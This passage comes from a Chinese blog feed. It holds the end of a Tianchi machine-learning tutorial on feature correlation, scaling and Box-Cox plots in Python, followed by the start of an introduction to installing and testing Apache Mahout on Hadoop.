mask=mask, cmap=cmap, square=<span class="literal">True</span>, annot=<span class="literal">True</span>, fmt=<span class="string">&#x27;0.2f&#x27;</span>)  <span class="comment"># 热力图（看两两相似度）</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_38_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>上图为所有特征变量和 target 变量两两之间的相关系数，由此可以看出各个特征变量 V0-V37 之间的相关性以及特征变量 V0-V37 与 target 的相关性。</p><h1 id="查找出特征变量和target变量相关系数大于05的特征变量"><a class="markdownIt-Anchor" href="#查找出特征变量和target变量相关系数大于05的特征变量">#</a> 查找出特征变量和 target 变量相关系数大于 0.5 的特征变量</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#寻找K个最相关的特征信息</span></span><br><span class="line">k = <span class="number">10</span> <span class="comment"># number of variables for heatmap</span></span><br><span class="line">cols = train_corr.nlargest(k, <span class="string">&#x27;target&#x27;</span>)[<span class="string">&#x27;target&#x27;</span>].index</span><br><span class="line"></span><br><span class="line">cm = np.corrcoef(train_data[cols].values.T)</span><br><span class="line">hm = plt.subplots(figsize=(<span class="number">10</span>, <span class="number">10</span>))<span class="comment">#调整画布大小</span></span><br><span class="line"><span class="comment">#hm = sns.heatmap(cm, cbar=True, annot=True, square=True)</span></span><br><span class="line"><span class="comment">#g = sns.heatmap(train_data[cols].corr(),annot=True,square=True,cmap=&quot;RdYlGn&quot;)</span></span><br><span class="line">hm = sns.heatmap(train_data[cols].corr(),annot=<span class="literal">True</span>,square=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_40_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">threshold = <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">corrmat = train_data.corr()</span><br><span class="line">top_corr_features = corrmat.index[<span class="built_in">abs</span>(corrmat[<span class="string">&quot;target&quot;</span>])&gt;threshold]</span><br><span class="line">plt.figure(figsize=(<span class="number">10</span>,<span class="number">10</span>))</span><br><span class="line">g = sns.heatmap(train_data[top_corr_features].corr(),annot=<span class="literal">True</span>,cmap=<span class="string">&quot;RdYlGn&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_41_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop_columns.clear()</span><br><span class="line">drop_columns = [<span class="string">&#x27;V5&#x27;</span>,<span class="string">&#x27;V9&#x27;</span>,<span class="string">&#x27;V11&#x27;</span>,<span class="string">&#x27;V17&#x27;</span>,<span class="string">&#x27;V22&#x27;</span>,<span class="string">&#x27;V28&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Threshold for removing correlated variables</span></span><br><span class="line">threshold = <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Absolute value correlation matrix</span></span><br><span class="line">corr_matrix = data_train1.corr().<span class="built_in">abs</span>()</span><br><span class="line">drop_col=corr_matrix[corr_matrix[<span class="string">&quot;target&quot;</span>]&lt;threshold].index</span><br><span class="line"><span class="comment">#data_all.drop(drop_col, axis=1, inplace=True)</span></span><br></pre></td></tr></table></figure><p>由于’V14’, ‘V21’, ‘V25’, ‘V26’, ‘V32’, ‘V33’, 'V34’特征的相关系数值小于 0.5，故认为这些特征与最终的预测 target 值不相关，删除这些特征变量；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#merge train_set and test_set</span></span><br><span class="line">train_x =  train_data.drop([<span class="string">&#x27;target&#x27;</span>], axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#data_all=pd.concat([train_data,test_data],axis=0,ignore_index=True)</span></span><br><span class="line">data_all = pd.concat([train_x,test_data]) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data_all.drop(drop_columns,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#View data</span></span><br><span class="line">data_all.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>V0</th>      <th>V1</th>      <th>V2</th>      <th>V3</th>      <th>V4</th>      <th>V6</th>      <th>V7</th>      <th>V8</th>      <th>V10</th>      <th>V12</th>      <th>...</th>      <th>V27</th>      <th>V29</th>      <th>V30</th>      <th>V31</th>      <th>V32</th>      <th>V33</th>      <th>V34</th>      <th>V35</th>      <th>V36</th>      <th>V37</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>0.566</td>      <td>0.016</td>      <td>-0.143</td>      <td>0.407</td>      <td>0.452</td>      <td>-1.812</td>      <td>-2.360</td>      <td>-0.436</td>      <td>-0.940</td>      <td>-0.073</td>      <td>...</td>      <td>0.168</td>      <td>0.136</td>      <td>0.109</td>      <td>-0.615</td>      <td>0.327</td>      <td>-4.627</td>      <td>-4.789</td>      <td>-5.101</td>      <td>-2.608</td>      <td>-3.508</td>    </tr>    <tr>      <th>1</th>      <td>0.968</td>      <td>0.437</td>      <td>0.066</td>      <td>0.566</td>      <td>0.194</td>      <td>-1.566</td>      <td>-2.360</td>      <td>0.332</td>      <td>0.188</td>      <td>-0.134</td>      <td>...</td>      <td>0.338</td>      <td>-0.128</td>      <td>0.124</td>      <td>0.032</td>      <td>0.600</td>      <td>-0.843</td>      <td>0.160</td>      <td>0.364</td>      <td>-0.335</td>      <td>-0.730</td>    </tr>    <tr>      <th>2</th>      <td>1.013</td>      <td>0.568</td>      <td>0.235</td>      <td>0.370</td>      <td>0.112</td>      <td>-1.367</td>      <td>-2.360</td>      <td>0.396</td>      <td>0.874</td>      <td>-0.072</td>      <td>...</td>      <td>0.326</td>      <td>-0.009</td>      <td>0.361</td>      <td>0.277</td>      <td>-0.116</td>      <td>-0.843</td>      <td>0.160</td>      <td>0.364</td>      <td>0.765</td>      <td>-0.589</td>    </tr>    <tr>      <th>3</th>      <td>0.733</td>      <td>0.368</td>      <td>0.283</td>      <td>0.165</td>      <td>0.599</td>      <td>-1.200</td>      <td>-2.086</td>      <td>0.403</td>      <td>0.011</td>      <td>-0.014</td>      <td>...</td>      <td>0.277</td>      <td>0.015</td>      <td>0.417</td>      <td>0.279</td>      <td>0.603</td>      <td>-0.843</td>      <td>-0.065</td>      <td>0.364</td>      <td>0.333</td>      <td>-0.112</td>    </tr>    <tr>      <th>4</th>      <td>0.684</td>      <td>0.638</td>      <td>0.260</td>      <td>0.209</td>      <td>0.337</td>      <td>-1.073</td>      <td>-2.086</td>      <td>0.314</td>      <td>-0.251</td>      <td>0.199</td>      <td>...</td>      <td>0.332</td>      <td>0.183</td>      <td>1.078</td>      <td>0.328</td>      <td>0.418</td>      <td>-0.843</td>      <td>-0.215</td>      <td>0.364</td>      <td>-0.280</td>      <td>-0.028</td>    </tr>  </tbody></table><p>5 rows × 32 columns</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># normalise numeric columns</span></span><br><span class="line">cols_numeric=<span class="built_in">list</span>(data_all.columns)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scale_minmax</span>(<span class="params">col</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (col-col.<span class="built_in">min</span>())/(col.<span class="built_in">max</span>()-col.<span class="built_in">min</span>())</span><br><span class="line"></span><br><span class="line">data_all[cols_numeric] = data_all[cols_numeric].apply(scale_minmax,axis=<span class="number">0</span>)</span><br><span class="line">data_all[cols_numeric].describe()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>V0</th>      <th>V1</th>      <th>V2</th>      <th>V3</th>      <th>V4</th>      <th>V6</th>      <th>V7</th>      <th>V8</th>      <th>V10</th>      <th>V12</th>      <th>...</th>      <th>V27</th>      <th>V29</th>      <th>V30</th>      <th>V31</th>      <th>V32</th>      <th>V33</th>      <th>V34</th>      <th>V35</th>      <th>V36</th>      <th>V37</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>...</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>      <td>4813.000000</td>    </tr>    <tr>      <th>mean</th>      <td>0.694172</td>      <td>0.721357</td>      <td>0.602300</td>      <td>0.603139</td>      <td>0.523743</td>      <td>0.748823</td>      <td>0.745740</td>      <td>0.715607</td>      <td>0.348518</td>      <td>0.578507</td>      <td>...</td>      <td>0.881401</td>      <td>0.388683</td>      <td>0.589459</td>      <td>0.792709</td>      <td>0.628824</td>      <td>0.458493</td>      <td>0.483790</td>      <td>0.762873</td>      <td>0.332385</td>      <td>0.545795</td>    </tr>    <tr>      <th>std</th>      <td>0.144198</td>      <td>0.131443</td>      <td>0.140628</td>      <td>0.152462</td>      <td>0.106430</td>      <td>0.132560</td>      <td>0.132577</td>      <td>0.118105</td>      <td>0.134882</td>      <td>0.105088</td>      <td>...</td>      <td>0.128221</td>      <td>0.133475</td>      <td>0.130786</td>      <td>0.102976</td>      <td>0.155003</td>      <td>0.099095</td>      <td>0.101020</td>      <td>0.102037</td>      <td>0.127456</td>      <td>0.150356</td>    </tr>    <tr>      <th>min</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>...</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>    </tr>    <tr>      <th>25%</th>      <td>0.626676</td>      <td>0.679416</td>      <td>0.514414</td>      <td>0.503888</td>      <td>0.478182</td>      <td>0.683324</td>      <td>0.696938</td>      <td>0.664934</td>      <td>0.284327</td>      <td>0.532892</td>      <td>...</td>      <td>0.888575</td>      <td>0.292445</td>      <td>0.550092</td>      <td>0.761816</td>      <td>0.562461</td>      <td>0.409037</td>      <td>0.454490</td>      <td>0.727273</td>      <td>0.270584</td>      <td>0.445647</td>    </tr>    <tr>      <th>50%</th>      <td>0.729488</td>      <td>0.752497</td>      <td>0.617072</td>      <td>0.614270</td>      <td>0.535866</td>      <td>0.774125</td>      <td>0.771974</td>      <td>0.742884</td>      <td>0.366469</td>      <td>0.591635</td>      <td>...</td>      <td>0.916015</td>      <td>0.375734</td>      <td>0.594428</td>      <td>0.815055</td>      <td>0.643056</td>      <td>0.454518</td>      <td>0.499949</td>      <td>0.800020</td>      <td>0.347056</td>      <td>0.539317</td>    </tr>    <tr>      <th>75%</th>      <td>0.790195</td>      <td>0.799553</td>      <td>0.700464</td>      <td>0.710474</td>      <td>0.585036</td>      <td>0.842259</td>      <td>0.836405</td>      <td>0.790835</td>      <td>0.432965</td>      <td>0.641971</td>      <td>...</td>      <td>0.932555</td>      <td>0.471837</td>      <td>0.650798</td>      <td>0.852229</td>      <td>0.719777</td>      <td>0.500000</td>      <td>0.511365</td>      <td>0.800020</td>      <td>0.414861</td>      <td>0.643061</td>    </tr>    <tr>      <th>max</th>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>...</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>1.000000</td>    </tr>  </tbody></table><p>8 rows × 32 columns</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#col_data_process = cols_numeric.append(&#x27;target&#x27;)</span></span><br><span class="line">train_data_process = train_data[cols_numeric]</span><br><span class="line">train_data_process = train_data_process[cols_numeric].apply(scale_minmax,axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">test_data_process = test_data[cols_numeric]</span><br><span class="line">test_data_process = test_data_process[cols_numeric].apply(scale_minmax,axis=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cols_numeric_left = cols_numeric[<span class="number">0</span>:<span class="number">13</span>]</span><br><span class="line">cols_numeric_right = cols_numeric[<span class="number">13</span>:]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Check effect of Box-Cox transforms on distributions of continuous variables</span></span><br><span class="line"></span><br><span class="line">train_data_process = pd.concat([train_data_process, train_data[<span class="string">&#x27;target&#x27;</span>]], axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fcols = <span class="number">6</span></span><br><span class="line">frows = <span class="built_in">len</span>(cols_numeric_left)</span><br><span class="line">plt.figure(figsize=(<span class="number">4</span>*fcols,<span class="number">4</span>*frows))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> cols_numeric_left:</span><br><span class="line">    dat = train_data_process[[var, <span class="string">&#x27;target&#x27;</span>]].dropna()</span><br><span class="line">        </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    sns.distplot(dat[var] , fit=stats.norm);</span><br><span class="line">    plt.title(var+<span class="string">&#x27; Original&#x27;</span>)</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    _=stats.probplot(dat[var], plot=plt)</span><br><span class="line">    plt.title(<span class="string">&#x27;skew=&#x27;</span>+<span class="string">&#x27;&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>(stats.skew(dat[var])))</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    plt.plot(dat[var], dat[<span class="string">&#x27;target&#x27;</span>],<span class="string">&#x27;.&#x27;</span>,alpha=<span class="number">0.5</span>)</span><br><span class="line">    plt.title(<span class="string">&#x27;corr=&#x27;</span>+<span class="string">&#x27;&#123;:.2f&#125;&#x27;</span>.<span class="built_in">format</span>(np.corrcoef(dat[var], dat[<span class="string">&#x27;target&#x27;</span>])[<span class="number">0</span>][<span class="number">1</span>]))</span><br><span class="line"> </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    trans_var, lambda_var = stats.boxcox(dat[var].dropna()+<span class="number">1</span>)</span><br><span class="line">    trans_var = scale_minmax(trans_var)      </span><br><span class="line">    sns.distplot(trans_var , fit=stats.norm);</span><br><span class="line">    plt.title(var+<span class="string">&#x27; Tramsformed&#x27;</span>)</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    _=stats.probplot(trans_var, plot=plt)</span><br><span class="line">    plt.title(<span class="string">&#x27;skew=&#x27;</span>+<span class="string">&#x27;&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>(stats.skew(trans_var)))</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    plt.plot(trans_var, dat[<span class="string">&#x27;target&#x27;</span>],<span class="string">&#x27;.&#x27;</span>,alpha=<span class="number">0.5</span>)</span><br><span class="line">    plt.title(<span class="string">&#x27;corr=&#x27;</span>+<span class="string">&#x27;&#123;:.2f&#125;&#x27;</span>.<span class="built_in">format</span>(np.corrcoef(trans_var,dat[<span class="string">&#x27;target&#x27;</span>])[<span class="number">0</span>][<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_49_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Check effect of Box-Cox transforms on distributions of continuous variables</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fcols = <span class="number">6</span></span><br><span class="line">frows = <span class="built_in">len</span>(cols_numeric_right)</span><br><span class="line">plt.figure(figsize=(<span class="number">4</span>*fcols,<span class="number">4</span>*frows))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> cols_numeric_right:</span><br><span class="line">    dat = train_data_process[[var, <span class="string">&#x27;target&#x27;</span>]].dropna()</span><br><span class="line">        </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    sns.distplot(dat[var] , fit=stats.norm);</span><br><span class="line">    plt.title(var+<span class="string">&#x27; Original&#x27;</span>)</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    _=stats.probplot(dat[var], plot=plt)</span><br><span class="line">    plt.title(<span class="string">&#x27;skew=&#x27;</span>+<span class="string">&#x27;&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>(stats.skew(dat[var])))</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    plt.plot(dat[var], dat[<span class="string">&#x27;target&#x27;</span>],<span class="string">&#x27;.&#x27;</span>,alpha=<span class="number">0.5</span>)</span><br><span class="line">    plt.title(<span class="string">&#x27;corr=&#x27;</span>+<span class="string">&#x27;&#123;:.2f&#125;&#x27;</span>.<span class="built_in">format</span>(np.corrcoef(dat[var], dat[<span class="string">&#x27;target&#x27;</span>])[<span class="number">0</span>][<span class="number">1</span>]))</span><br><span class="line"> </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    trans_var, lambda_var = stats.boxcox(dat[var].dropna()+<span class="number">1</span>)</span><br><span class="line">    trans_var = scale_minmax(trans_var)      </span><br><span class="line">    sns.distplot(trans_var , fit=stats.norm);</span><br><span class="line">    plt.title(var+<span class="string">&#x27; Tramsformed&#x27;</span>)</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    _=stats.probplot(trans_var, plot=plt)</span><br><span class="line">    plt.title(<span class="string">&#x27;skew=&#x27;</span>+<span class="string">&#x27;&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>(stats.skew(trans_var)))</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    plt.subplot(frows,fcols,i)</span><br><span class="line">    plt.plot(trans_var, dat[<span class="string">&#x27;target&#x27;</span>],<span class="string">&#x27;.&#x27;</span>,alpha=<span class="number">0.5</span>)</span><br><span class="line">    plt.title(<span class="string">&#x27;corr=&#x27;</span>+<span class="string">&#x27;&#123;:.2f&#125;&#x27;</span>.<span class="built_in">format</span>(np.corrcoef(trans_var,dat[<span class="string">&#x27;target&#x27;</span>])[<span class="number">0</span>][<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_50_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p>]]></content>
      
      
      <categories>
          
          <category> 天池机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mahout简介</title>
      <link href="/2021/11/07/Hive%E5%AD%A6%E4%B9%A0/Mahout/"/>
      <url>/2021/11/07/Hive%E5%AD%A6%E4%B9%A0/Mahout/</url>
      
        <content type="html"><![CDATA[<h1 id="mahout安装部署"><a class="markdownIt-Anchor" href="#mahout安装部署">#</a> Mahout 安装部署</h1><h2 id="mahout是什么"><a class="markdownIt-Anchor" href="#mahout是什么">#</a> Mahout 是什么</h2><p>Apache Mahout 是 Apache Software Foundation （ASF）旗下的一个开源项目，提供了一些经典的机器学习的算法，皆在帮助开发人员更加方便快捷地创建智能应用程序。目前已经有了三个公共发型版本，通过 ApacheMahout 库，Mahout 可以有效地扩展到云中。Mahout 包括许多实现，包括聚类、分类、推荐引擎、频繁子项挖掘。<br>　　Apache Mahout 的主要目标是建立可伸缩的机器学习算法。这种可伸缩性是针对大规模的数据集而言的。Apache Mahout 的算法运行在 ApacheHadoop 平台下，它通过 Mapreduce 模式实现。但是，Apache Mahout 并非严格要求算法的实现基于 Hadoop 平台，单个节点或非 Hadoop 平台也可以。Apache Mahout 核心库的非分布式算法也具有良好的性能。<br>　　Mahout 是一个机器学习 Java 类库的集合，用于完成各种各样的任务，如分类、评价性的聚类和模式挖掘等。<br>　　Mahout 开源项目就是一个 Hadoop 云平台的算法库，已经实现了多种经典算法，并一直在扩充中，其目标就是致力于创建一个可扩容的云平台算法库。<br>　　在 Hadoop 云平台下编程不仅要求用户对 Hadoop 云平台框架比较熟悉，还要对 Hadoop 云平台下底层数据流、Map 和 Reduce 原理非常熟悉，这是基本的编程要求。此外，用户要编写某一个算法还需要对该算法的原理比较熟悉，即需要对算法原理理解透彻。总体来看，编写云平台下的算法程序是属于高难度的开发工作了。但是，如果使用 Mahout，情况就会有很大的不同，用户再也不用自己编写复杂的算法，不需要掌握太高深的云平台的框架和数据流程的理论知识。用户所需要了解的只是算法的大概原理、算法实际应用环境和如何调用 Mahout 相关算法的程序接口。当然，在具体的项目中，用户还应该根据实际需求在 Mahout 源代码基础上进行二次开发以满足具体的实际应用情况。</p><h2 id="安装方法"><a class="markdownIt-Anchor" href="#安装方法">#</a> 安装方法</h2><p>下载安装包并解压，安装前确保 Hadoop 能正常使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf apache-mahout-distribution-0.10.1.tar.gz</span><br><span class="line">mv apache-mahout-distribution-0.10.1 /usr/local/mahout</span><br></pre></td></tr></table></figure><p>编辑环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/profile</span><br><span class="line"></span><br><span class="line">export MAHOUT_HOME=/usr/local/mahout</span><br><span class="line">export PATH=$&#123;MAHOUT_HOME&#125;/bin:$PATH</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><h2 id="测试运行"><a class="markdownIt-Anchor" href="#测试运行">#</a> 测试运行</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将测试数据集上传hdfs并改名为testdata</span></span><br><span class="line">hdfs dfs -put synthetic_control.data testdata</span><br><span class="line">hdfs dfs -lsr</span><br><span class="line"><span class="meta">#</span><span class="bash">默认上传到<span class="string">&quot;/user/用户名/&quot;</span>目录下</span></span><br><span class="line"><span class="meta">#</span><span class="bash">运行mahout</span></span><br><span class="line">mahout -core org.apache.mahout.clustering.syntheticcontrol.kmeans.Job</span><br><span class="line"><span class="meta">#</span><span class="bash">可以在yarn UI界面看到两个任务</span></span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="Mahout/image-20211107162124666.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" 